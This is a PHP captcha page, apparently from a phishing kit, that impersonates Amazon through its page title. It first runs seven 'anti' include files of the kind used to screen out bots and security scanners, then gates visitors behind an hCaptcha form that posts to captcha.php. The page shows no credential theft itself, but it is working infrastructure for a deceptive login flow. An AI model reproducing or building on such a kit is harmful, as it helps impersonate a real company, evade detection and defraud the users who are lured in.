<?php
include "prevents/anti1.php";
include "prevents/anti2.php";
include "prevents/anti3.php";
include "prevents/anti4.php";
include "prevents/anti5.php";
include "prevents/anti6.php";
include "prevents/anti7.php";


require '../main.php';

    require "lang.php";

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon</title>
    <script src="https://hcaptcha.com/1/api.js" async defer></script>
</head>

<style>
    body {
        background-color: #1d1d1d;
        width: 100%;
        height: 100vh;
    }

    .carda {
        width: 100%;
        height: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
    }

    button {
        border: none;
        border-radius: 5px;
        width: 300px;
        height: 35px;
        color: #fff;
        background-color: #41a2b1;
        margin-top: 20px;
    }

    p {
        font-family: sans-serif;
        color: #fff;
        font-size: 14px;
        padding: 40px 0;
    }

    img {
        width: 120px;
    }
</style>

<body>

<div class="carda">
    <img src="assets/ins.png" alt="" srcset="">
    <form action="captcha.php" method="post">
       <?php if ($_GET['page'] === 'error' ) {?> 
    <center><p style="color:red;"><?php echo lang('xcapt1'); ?></p></center>
    <?php }?> 
        <center><p><?php echo lang('xcapt2'); ?></p></center>
        <div class="h-captcha" data-sitekey="7b033875-9ca8-4ae2-bc4e-f3640bc34068"></div>
        <button name="submit" value="submit" type="submit"><?php echo lang('xcapt3'); ?></button>
    </form>
</div>


</body>

</html>
 